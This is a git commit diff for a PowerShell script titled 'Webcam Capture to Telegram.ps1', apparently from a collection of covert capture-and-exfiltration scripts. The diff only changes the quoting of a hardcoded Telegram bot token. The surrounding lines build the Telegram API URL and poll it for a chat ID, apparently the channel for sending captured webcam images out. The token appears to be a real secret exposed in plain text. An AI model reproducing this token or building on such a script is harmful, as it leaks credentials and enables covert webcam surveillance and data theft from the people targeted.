4751c030b228a854dc59fa948f9920b0f71fe6d7
poiuztreq <harder.alex@gmx.net>
2023-11-21 14:55:09 +0100

    fix3

--- Telegram and Dropbox Scripts/Webcam Capture to Telegram.ps1
+++ Telegram and Dropbox Scripts/Webcam Capture to Telegram.ps1
@@ -14,7 +14,8 @@ dagnazty - https://github.com/dagnazty
 #>
 
 
-$token = "6609237868:AAH3RePygk7Q6uAbvpasSiddOHIrLM3QGYI"
+
+$token = '6609237868:AAH3RePygk7Q6uAbvpasSiddOHIrLM3QGYI'
 $URL = 'https://api.telegram.org/bot{0}' -f $Token
 while($chatID.length -eq 0){
     $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
